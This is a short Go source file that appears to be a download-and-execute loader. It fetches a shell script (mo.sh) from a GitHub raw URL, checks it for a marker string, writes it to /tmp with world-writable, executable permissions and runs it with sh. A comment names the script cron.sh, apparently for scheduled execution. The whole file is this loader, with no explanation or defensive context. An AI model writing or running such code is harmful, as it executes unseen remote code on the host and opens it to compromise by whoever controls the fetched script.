package main




//download   of  script  cron.sh




import (


"os/exec"
"io/ioutil"
"net/http"
//"fmt"
"strings"


)




func  main() {


my_str := "#ATILA_VKZMN"





  cli :=  http.Client{}
   
 

 resp , err :=  cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/master/mo.sh")


        if err == nil {

          
          mo_bytes ,  err_readall := ioutil.ReadAll(resp.Body)

                if err_readall == nil {

          
                  mo_str :=  string(mo_bytes ) 


                  out   :=   strings.Contains(mo_str , my_str ) 

                     if  out == true {

           
                        ioutil.WriteFile("/tmp/mo.sh" ,  mo_bytes , 0777 )


                              mo := exec.Command("sh" , "/tmp/mo.sh" )
                                 
                              mo.Run()
 
                    
                      }
                                   






          }


}
 




}



